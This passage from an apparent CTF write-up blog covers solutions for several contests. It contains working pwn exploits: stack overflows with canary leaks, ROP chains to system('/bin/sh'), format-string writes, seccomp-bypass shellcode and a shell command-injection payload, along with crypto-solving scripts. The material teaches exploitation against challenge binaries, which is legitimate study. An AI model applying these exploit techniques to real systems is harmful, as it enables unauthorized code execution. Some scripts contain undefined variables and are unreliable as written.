ctt=[bytes.fromhex(ct[rki][:32]),bytes.fromhex(ct[rki][32:])] ctf=[bytes.fromhex(ct[rki+1][:32]),bytes.fromhex(ct[rki+1][32:])] buft=[0]*36 buff=[0]*36 rkl=[[set(),set()] for i in range(4)] for times in range(2): ct0t=ctt[times] ct0f=ctf[times] for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) for i in range(rki): buff[31-i] = buff[35-i] ^ tfunc(buff[34-i]^buff[33-i]^buff[32-i]^rk[i]) buff[31-i:35-i]=invpfunc(buff[31-i:35-i],WDB) buft[31-i] = buft[35-i] ^ tfunc(buft[34-i]^buft[33-i]^buft[32-i]^rk[i]) buft[31-i:35-i]=invpfunc(buft[31-i:35-i],WDB) assert(invpfunc(buft[31-rki:],DB)[1:]==invpfunc(buff[31-rki:],WDB)[1:]) ict=i2l(buft[32-rki]^buft[34-rki]^buft[33-rki]) icf=i2l(buff[32-rki]^buff[34-rki]^buff[33-rki]) dt=i2l(d(buff[35-rki]^buft[35-rki])) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl[i][times].add(guess) print(rkl) rkn=[(rkl[i][0]&rkl[i][1]) for i in range(4)] print(rkn) assert(all([len(i)==1 for i in rkn])) rkn=[list(i)[0] for i in rkn] rk.append(l2i(rkn)) print(rk[::-1]) def inv_expand_key(rk): k = [0]*36 k[-4:] = rk for i in range(32): k[-i - 5] = k[-i-1] ^ (round_key(k[-i - 2] ^ k[-i - 3] ^ k[-i -4] ^ SM4_CK[-i-1])) MK=xor(k[0:4],SM4_FK) return MK,k[4:] from Crypto.Util.number import * MK,rks=inv_expand_key(rk[::-1]) print(MK,rks) def inv_one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] buf=buf[::-1] dance() for i in range(31,-1,-1): buf[i+1:i+5] = invpfunc(buf[i+1:i+5],Dance_Box) buf[i] = buf[i+4] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) if dt == i: dance() for _ in range(4): out += i2l(buf[_]) return out print(bytes(inv_one_round(bytes.fromhex(ct[0][:32]),rks,31))+bytes(inv_one_round(bytes.fromhex(ct[0][32:]),rks,31))) exit() for i in range(10): key=long_to_bytes(getrandbits(128)) rk=expand_key(key) ans=one_round(key,rk,31) key1=inv_one_round(ans,rk,31) print(key,key1)","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"N1CTF","slug":"N1CTF","permalink":"http://lmarch2.github.io/tags/N1CTF/"}]},{"title":"HASHTEAM2024香山杯WP","slug":"HASHTEAM香山杯WP","date":"2023-10-27T13:00:57.000Z","updated":"2024-02-04T06:55:26.435Z","comments":true,"path":"posts/2611e12a/","link":"","permalink":"http://lmarch2.github.io/posts/2611e12a/","excerpt":"","text":"本wp是队友们共同努力的结果，感谢.N1nEmAn、HeyGap、1cfh、shui、hash_hash等师傅。 HASHTEAM香山杯WPmisc签到题将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。 因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。 webPHP_unserialize_pro查看源码，很显然就是一个反序列化利用。 但是过滤了f l a g * ?，需要绕过。这里首先使用dir -1 /查看flag位置，发现是在第五个。然后使用rev /$(dir -l / | sed -n 5p)读取flag。得到一个反向flag。 再次反向得到flag。 ~/ctf/match/xsb2023/web » rev flag N1nE@N1nEmAn flag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018} ReURL从哪儿来运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。 运行ou.exe文件，发现在v18 += strlen(v18)处下断点，搜索flag可以得到flag。 hello python了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。 def shift(z, y, x, k, p, e): return ((((z >> 5) ^ (y < 2)) + ((y >> 3) ^ (z < 4))) ^ ((x ^ y) + (k[(p & 3) ^ e] ^ z))) def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) & 0xFFFFFFFF e = (x >> 2) & 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF z = v[n - 1] return v def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) & 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x >> 2) & 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF y = v[0] x = (x - delta) & 0xFFFFFFFF return v c = [689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ] k = [12345678 ,12398712 ,91283904 ,12378192 ] m = (decrypt(c, k)) for i in m: print(bytes.fromhex(hex(i)[2:]).decode()[::-1], end='') --------------------------------------------------------------------","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"杯子","slug":"杯子","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"}]},{"title":"DASCTF X CBCTF 2023 WP","slug":"DASCTF-X-CBCTF-2023-WP","date":"2023-10-27T12:56:45.000Z","updated":"2024-02-04T09:19:32.946Z","comments":true,"path":"posts/ec1aa757/","link":"","permalink":"http://lmarch2.github.io/posts/ec1aa757/","excerpt":"","text":"DASCTF X CBCTF 2023 WP PWNEASYBOX这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅 最后发现直接就是个web题，在PING函数里面执行system函数命令 ;tac fla’’g; 还有一种解法是栈溢出 catCommand中strcat的第二个参数s没有ban掉”..”，所以存在目录穿越能够读前面init函数中的canary文件 gets是把v1这个fd对应的文件中的数据读到栈上，读0x200大小，但其实v11这个数组只有120大小，所以就可能存在溢出 from Excalibur import* import base64 contextset() #remo('node4.buuoj.cn',25365) proc('./pwn') sla(b'name:',b'a\\n') sla(b'a',b'CAT') sla(b'view:',b'../secret/canary.txt') rc() canary = (ru(b'\\n')) canary = int(canary,16) prh(canary) pop_rdi = 0x0000000000401ce3 binsh = 0x0000000000402090 ret = 0x000000000040101a system = 0x00000000004018B2 sla(b'$',b'PING') pay = b'a'*0x48+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(system) pay = base64.b64encode(pay) py = b\";echo \"+b'\"' py += pay py += b'\" | base64 -d' sla(b\"address\",py) sla(b'$',b\"CAT\") sla(b\"view\",\"result.txt\") ia() GuestBook输入name的时候有溢出，可以覆盖一个字节泄露canary， 接着在strcpy中有溢出，直接传payload，被strcpy遇b’\\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\\x00，然而canary以\\x00结尾） 调试解决发现在 __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零 于是可以通过多次输入先输入覆盖返回地址和canary除去\\x00的七个字符，再给canary补上\\x00 from Excalibur import* contextset() remo('node4.buuoj.cn',28227) #proc('./GuestBook') #debug('b *0x000000000040143C') sla(b'name:',b'a'*(0x17)+b'b') t1 = ru(b'\\n') pr(t1) canary0 = ru(b'How')[:-7] canary = (u64(b'\\x00'+canary0)) prh(canary) system = 0x00000000004012C3 sla(b'):',b'4') sl(cyclic(0x98)+b'a'+canary0+b'a'*8+p64(system)) sl(b'a') sl(b'a') pr(type(canary)) pay = cyclic(0x38)#+p64(canary)+b'a'*8+p64(system) sl(pay) ia() CryptoRSA想恢复p,关键在于二次剩余 加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复 对于q就更简单,直接求多项式的gcd即可 代码如下 from gmpy2 import * from Crypto.Util.number import * c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369 (e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983) (e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714) n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393 n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309 str0=''#wp装不下这么长的字符 #legendre_symbol(i,p) def GCD(a, b): if(b == 0): return a.monic() else: return GCD(b, a % b) F.=PolynomialRing(Zmod(n2)) f1=(x+noise1)^e1-c1 f2=(x+noise2)^e2-c2 #print(GCD(f1,f2)) q=n2-103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936 print(q) print(q.nbits()) strlist=str0.split('n') #print(strlist) intlist=[int(i) for i in strlist[:-1]] #print(intlist) p='' for i in intlist: #print('test'+p) if jacobi(i,n1)==1: p='1'+p #print(p) else: p='0'+p print(p) print(int(p,base=2)) p=int(p,base=2) print(is_prime(p)) print(ZZ(p).nbits()) n=p*q phi=(p-1)*(q-1) d=inverse_mod(65537,phi) print(long_to_bytes(int(pow(c,d,n)))) CB backpack由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原 脚本丢了XD","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"DASCTF","slug":"DASCTF","permalink":"http://lmarch2.github.io/tags/DASCTF/"}]},{"title":"NSSCTF 2nd wp","slug":"NSSCTF 2nd wp","date":"2023-08-29T16:31:50.000Z","updated":"2024-02-04T15:58:57.155Z","comments":true,"path":"posts/4b18615c/","link":"","permalink":"http://lmarch2.github.io/posts/4b18615c/","excerpt":"","text":"NSSCTF 2nd WPMISCgift_in_qrcodeimport qrcode from PIL import Image from random import randrange, getrandbits, seed import os import base64 flag = os.getenv(\"FLAG\") if flag == None: flag = \"flag{test}\" secret_seed = randrange(1, 1000) seed(secret_seed) reveal = [] for i in range(20): reveal.append(str(getrandbits(8))) target = getrandbits(8) reveal = \",\".join(reveal) img_qrcode = qrcode.make(reveal) img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35)) offset, delta, rate = 50, 3, 5 img_qrcode = img_qrcode.resize( (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS ) img_out = Image.new(\"RGB\", img_qrcode.size) for y in range(img_qrcode.size[1]): for x in range(img_qrcode.size[0]): pixel_qrcode = img_qrcode.getpixel((x, y)) if pixel_qrcode == 255: img_out.putpixel( (x, y), ( randrange(offset, offset + delta), randrange(offset, offset + delta), randrange(offset, offset + delta), ), ) else: img_out.putpixel( (x, y), ( randrange(offset - delta, offset), randrange(offset - delta, offset), randrange(offset - delta, offset), ), ) img_out.save(\"qrcode.png\") with open(\"qrcode.png\", \"rb\") as f: data = f.read() print(\"This my gift:\") print(base64.b64encode(data).decode(), \"\\n\") print(target) ans = input(\"What's your answer:\") if ans == str(target): print(flag) else: print(\"No no no!\") 题目所给附件内容如上 分析过后发现直接输入打印出的target即可获得flag Magic Docker题目提示执行命令，docker run randark/nssctf-round15-magic-docker 执行过后发现要求输入secrect 查看docker文件 发现app文件下的miain.py文件为 import click import random import sys import os from time import sleep @click.command() @click.option('--secret',help='default=none,between 0 and 100',type=int) def func(secret): if str(secret)==str(answer): print(\"Congratulations!\") print(\"But where is your flag? (=‵ω′=)\") else: print(\"No! You don't know anything about docker!\") print(\"How dare you! \") BANNER=\"\"\" ███╗ ██╗███████╗███████╗ ██████╗████████╗███████╗ ██████╗ ███╗ ██╗██████╗ ████╗ ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝ ╚════██╗████╗ ██║██╔══██╗ ██╔██╗ ██║███████╗███████╗██║ ██║ █████╗ █████╔╝██╔██╗ ██║██║ ██║ ██║╚██╗██║╚════██║╚════██║██║ ██║ ██╔══╝ ██╔═══╝ ██║╚██╗██║██║ ██║ ██║ ╚████║███████║███████║╚██████╗ ██║ ██║ ███████╗██║ ╚████║██████╔╝ ╚═╝ ╚═══╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═╝ ╚══════╝╚═╝ ╚═══╝╚═════╝ ███╗ ███╗ █████╗ ██████╗ ██╗ ██████╗ ██████╗ ██████╗ ██████╗██╗ ██╗███████╗██████╗ ████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝ ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗ ██╔████╔██║███████║██║ ███╗██║██║ ██║ ██║██║ ██║██║ █████╔╝ █████╗ ██████╔╝ ██║╚██╔╝██║██╔══██║██║ ██║██║██║ ██║ ██║██║ ██║██║ ██╔═██╗ ██╔══╝ ██╔══██╗ ██║ ╚═╝ ██║██║ ██║╚██████╔╝██║╚██████╗ ██████╔╝╚██████╔╝╚██████╗██║ ██╗███████╗██║ ██║ ╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ \"\"\" if __name__ == \"__main__\": os.system(\"rm -f /flag\") print(BANNER) random.seed(\"NSSCTF 2nd\") answer=random.randint(0,100) if len(sys.argv)&lt;2: print(\"You need to give me the secret!\") else: func() 若按照预设命令执行完main.py后，容器会删除flag文件 所以我们自定义docker启动命令 直接执行cat /flag gift_in_qrcode(revenge)链接一下得到一堆Base64编码 先写个脚本解码Base64保存为png import base64 # Paste the Base64 encoded string here base64_string = \"your_base64_string_here\" # Decode the Base64 string decoded_data = base64.b64decode(base64_string) # Save the decoded data as a PNG file with open(\"image.png\", \"wb\") as f: f.write(decoded_data) 扫码得到二十个随机数 根据计算随机数种子，并计算下一个随机数，输入程序中即可拿到flag from random import randrange, getrandbits, seed def poc(): for i in range(1,1000): secret_seed = i seed(secret_seed) a = [97,45,232,198,115,215,226,198,32,189,8,210,84,11,150,134,221,207,167,176] reveal = [] for i in range(20): reveal.append(getrandbits(8)) if reveal == a: flag = getrandbits(8) return flag return False print(poc()) 然后最无脑的爆破来了 为什么要爆这么久，早知道我再多爆一会的.. from pwn import * count = 0 while True: conn = remote(\"node5.anna.nssctf.cn\", 28380) conn.recvline().decode() conn.recvline().decode() conn.recv().decode() conn.sendline(str('110').encode()) count += 1 print('count:', count) output = conn.recvline().decode() if 'No no no!' not in output: print(output) break CryptoEzRSA发现e - 3 ，低加密指数爆破 脚本一把梭 import binascii import gmpy2 e = 3 # 读入 n, 密文 n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857 c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077 i = 0 while 1: res = gmpy2.iroot(c+i*n,3) if(res[1] == True): m=res[0] print(binascii.unhexlify(hex(m)[2:].strip(\"L\"))) break print(\"i=\"+str(i)) i = i+1 NSSCTF{Rea1_Si9n3n} FunnyEncrypt 本来想看看能不能词频分析的，结果发现完全对不到 只好根据已知的nssctf和前面的一堆话里面寻找符合预感的字符与字母对应关系 ， 慢慢对应着可以找到的 PWNhappy 主函数首先绕过proof，接着fork一个子进程，在父进程中进行一个有沙箱限制的shellcode执行 这个地方在调试的时候可能容易卡住，需要用set follow-fork-mode parent停留在父进程继续调试 首先我们来看proof函数 要想让v4=v3，那么只能通过printf看看可不可以把一些信息泄露出来，然后再通过计算得到puts的地址 通过调试能够发现，printf可以把栈上的数据打印出来，这里选择泄露出_IO_2_1_stderr_的libc地址 计算得到puts的真实地址，绕过proof检测 这里一定注意scanf函数的一些特性，特别是涉及到\\n，+-号函数是会部分忽略还是完全忽略还是正常调用十分关键，这可以帮助节约大量调试的时间 参考：https://blog.csdn.net/qq_54218833/article/details/121308367 接下来就是shellcode的编写了 __int64 sandbox() { __int64 v1; // [rsp+8h] [rbp-8h] v1 = seccomp_init(2147418112LL); seccomp_rule_add(v1, 0LL, 0LL, 0LL); seccomp_rule_add(v1, 0LL, 42LL, 0LL); seccomp_rule_add(v1, 0LL, 57LL, 0LL); seccomp_rule_add(v1, 0LL, 322LL, 0LL); return seccomp_load(v1); } 可以看出来禁用了read，connect，execve 调用 这里用open，pread64，write绕过 写exp from Excalibur import* contextset() proc('./pwn') #debug('b *0x4013FA\\nb *0x401514\\n') #debug('b *0x40142E\\nb *0x401490\\n') #debug('b *0x401508\\n') debug('b *0x401563\\n') el('./pwn') lib('./libc.so.6') puts_got = got('puts')#0x403FF0 stderr = libcsym('_IO_2_1_stderr_') puts = libcsym('puts') sla(b'konw',b'16') for i in range(0,16): sl(b'+') #sl(b'a') ru(b'0') std = int(rec(15)) prh(std) libcbase = std - stderr puts = libcbase+puts prh(puts) pr(str(puts)) sda(b'try',str(puts)) bss = 0x4040A0 shellcode =''' nop nop push 0x67616c66 mov rdi, rsp xor rdx, rdx xor rsi, rsi push 0x2 pop rax syscall ''' #shellcraft.open(\"flag\") shellcode += ''' push 0x11 pop rax push 0x4041A0 pop rsi push 0x3 pop rdi push 0x64 pop rdx push 0x0 pop r10 syscall ''' shellcode += shellcraft.write(1,bss + 0x100, 100) shellcode = asm(shellcode) print(shellcode) print(len(shellcode)) sl(shellcode) ia()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"}]},{"title":"WSL2下不能使用gdb.attach的解决方案","slug":"WSL2下不能使用gdb-attach的解决方案","date":"2023-08-29T12:53:24.000Z","updated":"2024-02-04T06:46:48.950Z","comments":true,"path":"posts/19b7c9d1/","link":"","permalink":"http://lmarch2.github.io/posts/19b7c9d1/","excerpt":"","text":"pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题 安装tmux用root权限安装 sudo apt-get install tmux 进入根目录 cd ~ 编辑配置使用root权限打开tmux，方便保存配置文件 sudo tmux 新建.tmux.conf文件 vim .tmux.conf 在文件中输入 #输入 bind-key c new-window -c \"#{pane_current_path}\" bind-key % split-window -h -c \"#{pane_current_path}\" bind-key '\"' split-window -c \"#{pane_current_path}\" set -g mouse on 关闭所有tmux窗口并输入 tmux source-file ~/.tmux.conf 重新启动tmux则完成更改、 使用接下来可以在exp中下断点了 gdb.attach(p) 同时要在exp中加上指定terminal context.terminal = [‘tmux’, ‘splitw’, ‘-h’] -h代表横向分屏 之后就可以在运行exp时debug 注意要在tmux终端下运行","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"}]},{"title":"NSSCTF ROUND#14 wp","slug":"ROUND14 love","date":"2023-08-29T12:46:39.000Z","updated":"2024-02-04T06:52:26.261Z","comments":true,"path":"posts/fa745d1d/","link":"","permalink":"http://lmarch2.github.io/posts/fa745d1d/","excerpt":"","text":"NSSCTF ROUND#14love0x01程序开启NX和canary保护 vuln函数中存在栈溢出 变量v4 = 555，v5 = 520 read函数读入0x40字节，在printf处有格式化字符串漏洞 需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改 思路： 利用格式化字符串漏洞任意写修改让v4=v5，进入vuln函数 利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址 构造pay覆盖返回地址为og或system rop链getshell 0x02第一步将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208 这里可构造pay为 pay = ‘%’+str(8)+’c’+’%9$hhn’ 或者 pay = ‘%’+str(520)+’c’+’%9$hhn’ （也可以直接n不用hhn） 第二步泄露canary 和 __libc_start_main地址 这里需要先patchelf再调试确定偏移 这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary 确定canary的偏移为9+6 = 15；__libc_start_main+243便宜为11+6 = 17 pay += ‘-%15$p-%17$p-‘ 0x03覆盖返回地址为one_gadget，或者调用system函数 from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] p = process(\"./pwn\") #p = remote('node4.anna.nssctf.cn',28157) sda = lambda delim,data :p.sendafter(delim,data) sd = lambda data :p.send(data) sea = lambda delim,data :p.sendafter(delim,data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim,data) ru = lambda delims,drop=True :p.recvuntil(delims,drop) uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lg = lambda name,addr :log.success(name+'='+hex(addr)) ra = lambda :p.interactive() def get_addr64() : return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) def get_addr32() : return u32(p.recvuntil(b'\\xf7')[-4:]) #gdb.attach(p) elf = ELF('./pwn') libc = ELF('./libc.so.6') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] pay = '%'+str(520)+'c'+'%9$hhn' pay += '-%15$p-%17$p-' gdb.attach(p) sla(b'Toka\\n',pay) ru('-') #泄露cannary canary = int(ru('-'),16) #libc libc_base = int(ru('-'),16)-243-libc.sym['__libc_start_main'] pop_rdi = 0x00000000004013f3 #pay=b'A'*0x28+p64(canary)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln']) #sla('level\\n',pay) #libcbase = get_addr64()-libc.sym['puts'] #lg('libcbase',libcbase) lg('canary',canary) lg('libc_base',libc_base) system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() lg('system',system_addr) lg('binsh',bin_sh_addr) ru('level\\n') ret =0x000000000040101a og = [0xe3afe,0xe3b01,0xe3b04] pay = b'a'*0x28+p64(canary)+b'a'*8+p64(ret)+p64(og[1]+libc_base) #pay = b'a'*0x28+p64(canary)+b'a'*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr) sl(pay) ra()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"}]},{"title":"ret2libc3合集","slug":"ret2libc3合集","date":"2023-08-29T12:45:22.000Z","updated":"2024-02-04T06:46:34.792Z","comments":true,"path":"posts/be5100f9/","link":"","permalink":"http://lmarch2.github.io/posts/be5100f9/","excerpt":"","text":"ret2libc3目前一些比较经典的ret2libc2的总合集，包括32位和64位，有libc文件和没有libc文件 ctf-wiki ret2libc3考点：栈溢出rop 0x01file checksec —— 32-bit 开NX 漏洞和内存分析和之前的系列题类似，不赘述了 0x02IDA看源码，既没有system也没有binsh 由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）而现在我们有一个puts函数，libc中也有system和binsh 0x03我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和/bin/sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去libc- database -search的网站查询，可得到puts函数system函数和binsh字符串对应的偏移地址 知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，/bin/sh字符串的偏移相加，就可以得到对应的真实地址然后写完整的exp 0x04所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和/bin/sh的地址，拿到shell #first exp from pwn import * elf=ELF('ret2libc3') p=process('./ret2libc3') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] start_addr = elf.symbols['_start'] payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) p.sendlineafter(\"!?\",payload1) puts_addr=u32(p.recv(4)) print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) print(\"puts addr = \", hex(puts_addr)) p.interactive() #second exp from pwn import * p = process('./ret2libc3') elf = ELF('./ret2libc3') puts_got_addr = elf.got['puts'] puts_plt_addr = elf.plt['puts'] main_plt_addr = elf.symbols['_start'] print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) p.recv() p.sendline(payload) puts_addr = u32(p.recv()[0:4]) print(\"puts_addr = \",hex(puts_addr)) sys_offset = 0x03cd10 puts_offset = 0x067360 sh_offset = 0x17b8cf #根据公式 libc基地址 + 函数偏移量 = 函数真实地址 来计算 libc_base_addr = puts_addr - puts_offset #计算出libc基地址 sys_addr = libc_base_addr + sys_offset #计算出system的真实地址 sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址 print(\"libc_base_addr = \",hex(libc_base_addr)) print(\"sys_addr = \",hex(sys_addr)) print(\"sh_addr = \",hex(sh_addr)) payload2 = flat([b'A'*112, p32(sys_addr), \"AAAA\", p32(sh_addr)]) p.sendline(payload2) p.interactive() 或者写 puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) 一定注意发送pay前接收的内容0x05搜索libc常用方法： LibcSearcher 网站查找 libc-databasellibc database search libc-database 参考资料：pwn小白入门06–ret2libc基本ROP之ret2libc3yichen二进制安全 对于返回地址不同而导致的输入偏移不同 ciscn_2019_c_10x01简单的ret2libc3file checksec —— 64-bit 开NX 0x02运行一下看看 再看看IDA 研究了半天发现是让你加解密的再看看string window 没用system和binsh又发现加密函数里有gets函数，可构成栈溢出 0x03分析大致流程就是 利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本 用同一个程序里函数的地址-libc里的函数地址即可得到偏移量 得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’/bin/sh‘） 0x04写exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() 0x05libcsearch的github网址安装 git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop 